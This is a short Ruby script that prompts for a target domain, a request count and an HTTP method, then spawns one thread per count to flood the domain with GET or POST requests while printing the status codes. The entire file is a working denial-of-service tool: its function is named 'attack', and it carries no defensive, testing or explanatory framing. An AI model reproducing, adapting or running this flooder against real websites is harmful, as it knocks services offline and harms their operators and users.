system("clear")
require "http"
require "thread"
require 'colorize'
sleep 3
system("clear")

puts "give me your domain (exp:http://Google.Com): ".blue.bold
domain = gets.chomp
puts "count:".blue.bold
count = gets.chomp 
puts "chose your type [post/get]".blue.bold
type = gets.chomp


def attack(domain,type)
if type == "post"
code = HTTP.post(domain).code
elsif type == "get" 
code = HTTP.get(domain).code
else
abort('not supported attack type')
end
puts "http code #{code}".red.bold
end


start = 0
stop  = count

threads = ("#{start}".."#{stop}").map do |int|  
  Thread.new do
    attack(domain,type) 
  end
end

threads.each(&:join)
